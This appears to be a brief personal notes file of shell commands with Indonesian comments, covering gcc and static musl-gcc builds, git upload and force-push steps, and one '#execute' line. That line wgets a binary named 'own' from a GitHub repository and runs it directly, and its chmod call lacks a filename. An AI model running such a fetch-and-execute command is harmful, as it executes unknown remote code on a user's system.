#compile

gcc -o x x.c

gcc x.c -o x -pthread

gcc x.c -o x -lpthread

apt update && apt install musl musl-dev musl-tools

musl-gcc -static own.c -o own

musl-gcc -static sx.c -o sx


#execute

wget https://github.com/x011-al/flex-x/raw/refs/heads/main/own && chmod +x && ./own


# upload file ke git

git add namafile

git commit -m "menambahkan file namafile"

Buka GitHub → Settings → Developer settings → Personal access tokens

git remote set-url origin https://x011-al@github.com/x011-al/tesb.git

git push origin main

#gabung commite

git pull origin main --rebase

git push origin main

#replace commite

git push origin main --force



